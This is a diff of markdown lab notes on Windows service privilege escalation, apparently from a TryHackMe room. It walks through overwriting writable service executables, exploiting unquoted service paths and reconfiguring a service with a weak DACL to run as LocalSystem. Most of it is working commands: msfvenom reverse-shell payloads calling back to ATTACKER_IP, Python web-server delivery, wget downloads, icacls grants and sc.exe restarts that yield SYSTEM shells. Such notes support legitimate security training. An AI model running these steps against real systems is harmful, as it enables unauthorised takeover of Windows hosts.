@@ -215,10 +215,10 @@ HKLM\SYSTEM\CurrentControlSet\Services\
 * Only administrators can modify these registry entries by default.
 
 ## Insecure Permissions on Service Executable
-* Attacker can gain privileges of service's account trivially.
+* Attacker can gain privileges of service's account trivially if service executable has insecure permsissions.
 * Splinterware System Scheduler vulnerability example.
 ```
-sc qc WindowsScheduler
+sc.exe qc WindowsScheduler
 [SC] QueryServiceConfig SUCCESS
 
 SERVICE_NAME: windowsscheduler
@@ -245,17 +245,11 @@ C:\PROGRA~2\SYSTEM~1\WService.exe Everyone:(I)(M)
 Successfully processed 1 files; Failed processing 0 files
 ```
 * Everyone group has modify permissions `(M)` on executable.
-  * Can be overwritten with malicious payload.
+* Executable can be overwritten with malicious payload.
 * Service will be executed with privileges of "svcuser1" user account.
 * Generate exe-service payload using `msfvenom`.
 ```
 msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4445 -f exe-service -o rev-svc.exe
-[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
-[-] No arch selected, selecting arch: x64 from the payload
-No encoder specified, outputting raw payload
-Payload size: 460 bytes
-Final size of exe-service file: 48640 bytes
-Saved as: rev-svc.exe
 ``` 
 * Serve payload through python webserver.
 ```
@@ -270,16 +264,15 @@ wget http://ATTACKER_IP:8000/rev-svc.exe -O rev-svc.exe
 ```
 cd C:\PROGRA~2\SYSTEM~1\
 
-C:\PROGRA~2\SYSTEM~1> move WService.exe WService.exe.bkp
+move WService.exe WService.exe.bkp
         1 file(s) moved.
 
-C:\PROGRA~2\SYSTEM~1> move C:\Users\thm-unpriv\rev-svc.exe WService.exe
+move C:\Users\thm-unpriv\rev-svc.exe WService.exe
         1 file(s) moved.
 ```
 * Grant full permissions to Everyone group as need another user to execute payload.
 ```
 icacls WService.exe /grant Everyone:F
-        Successfully processed 1 files.
 ```
 * Start reverse listener on attacking machine.
 ```
@@ -287,11 +280,13 @@ nc -lvnp 4445
 Listening on 0.0.0.0 4445
 ```
 * Restart service (if current user has permissions).
+* PowerShell has `sc` as an alias to `Set-Content`.
+  * Need to use `sc.exe` to control services with PowerShell this way.
 ```
-Stop-Service -Name "windowsscheduler"
-Start-Service -Name "windowsscheduler"
+sc.exe stop windowsscheduler
+sc.exe start windowsscheduler
 ```
-* Reverse shell with svcusr1 privileges received.
+* Reverse shell with "svcusr1" privileges received.
 ```
 Connection received on 10.10.175.90 50649
 Microsoft Windows [Version 10.0.17763.1821]
@@ -305,7 +300,7 @@ wprivesc1\svcusr1
 * Very particular behaviour occurs when a service is configured to point to an "unquoted" executable.
   * Path of executable not properly quoted to account for spaces.
 ```
-Set-Content qc "disk sorter enterprise"
+sc.exe qc "disk sorter enterprise"
 [SC] QueryServiceConfig SUCCESS
 
 SERVICE_NAME: disk sorter enterprise
@@ -362,7 +357,7 @@ Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
 ```
 * Pull payload from PowerShell.
 ```
-wget http://ATTACKER_IP:8000/rev-svc.exe -O rev-svc2.exe
+wget http://ATTACKER_IP:8000/rev-svc2.exe -O rev-svc2.exe
 ``` 
 * Start listener to receive reverse shell.
 ```
@@ -377,14 +372,13 @@ move C:\Users\thm-unpriv\rev-svc2.exe C:\MyPrograms\Disk.exe
   * Ensures file can be executed by the service.
 ```
 icacls C:\MyPrograms\Disk.exe /grant Everyone:F
-        Successfully processed 1 files.
 ```
 * Restart service to execute payload.
 ```
-Stop-Service -Name "disk sorter enterprise"
-Start-Service -Name "disk sorter enterprise"
+sc.exe stop "disk sorter enterprise"
+sc.exe start "disk sorter enterprise"
 ```
-* Reverse shell with svcusr2 privileges received.
+* Reverse shell with "svcusr2" privileges received.
 ```
 Microsoft Windows [Version 10.0.17763.1821]
 (c) 2018 Microsoft Corporation. All rights reserved.
@@ -393,7 +387,87 @@ C:\Windows\system32>whoami
 wprivesc1\svcusr2
 ```
 ## Insecure Service Permissions
+* Service DACL (not service's executable DACL) allows reconfiguration of the service.
+* Point service at any executable and run it with any account.
+* [Accesschk](https://docs.microsoft.com/en-us/sysinternals/downloads/accesschk) from Sysinternals suite used to check for service DACL.
+  * Command to check for "thmservice" DACL.
+```
+accesschk64.exe -qlc thmservice
+  [0] ACCESS_ALLOWED_ACE_TYPE: NT AUTHORITY\SYSTEM
+        SERVICE_QUERY_STATUS
+        SERVICE_QUERY_CONFIG
+        SERVICE_INTERROGATE
+        SERVICE_ENUMERATE_DEPENDENTS
+        SERVICE_PAUSE_CONTINUE
+        SERVICE_START
+        SERVICE_STOP
+        SERVICE_USER_DEFINED_CONTROL
+        READ_CONTROL
+  [4] ACCESS_ALLOWED_ACE_TYPE: BUILTIN\Users
+        SERVICE_ALL_ACCESS
+```
+* `BUILTIN\Users` group has `SERVICE_ALL_ACCESS` permission.
+   * Any user can reconfigure service.
+* Build exe-service reverse shell in `msfvenom`.
+```
+msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4447 -f exe-service -o rev-svc3.exe
+```
+* Start listener for connection on attacker's machine.
+```
+nc -lvnp 4447
+Listening on [0.0.0.0] (family 0, port 4447)
+```
+* Serve payload through python webserver.
+```
+python3 -m http.server
+Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
+```
+* Pull payload from PowerShell.
+```
+wget http://ATTACKER_IP:8000/rev-svc3.exe -O rev-svc3.exe
+``` 
+* Move payload to `C:\Users\thm-unpriv\rev-svc3.exe` if necessary.
+* Grant "Everyone" permission to execute payload.
+```
+icacls C:\Users\thm-unpriv\rev-svc3.exe /grant Everyone:F
+```
+* Change service's associated executable and account.
+  * Note spaces after equal signs when using `sc`.
+  * LocalSystem account chosen as it is highest privilege account available.
+```
+sc.exe config thmservice binPath= "C:\Users\thm-unpriv\rev-svc3.exe" obj= LocalSystem
+```
+* Restart service to trigger payload.
+```
+sc.exe stop thmservice
 
+[SC] ControlService FAILED 1062:
+
+The service has not been started.
+
+sc.exe start thmservice
+
+SERVICE_NAME: thmservice
+        TYPE               : 10  WIN32_OWN_PROCESS
+        STATE              : 2  START_PENDING
+                                (NOT_STOPPABLE, NOT_PAUSABLE, IGNORES_SHUTDOWN)
+        WIN32_EXIT_CODE    : 0  (0x0)
+        SERVICE_EXIT_CODE  : 0  (0x0)
+        CHECKPOINT         : 0x0
+        WAIT_HINT          : 0x7d0
+        PID                : 3328
+        FLAGS              :
+```
+* Shell recieved bak to attacker with SYSTEM privileges.
+```
+onnection from 10.10.29.166 49894 received!
+Microsoft Windows [Version 10.0.17763.1821]
+(c) 2018 Microsoft Corporation. All rights reserved.
+
+C:\Windows\system32>whoami
+whoami
+nt authority\system
+```
 # Abusing Dangerous Privileges
 
 
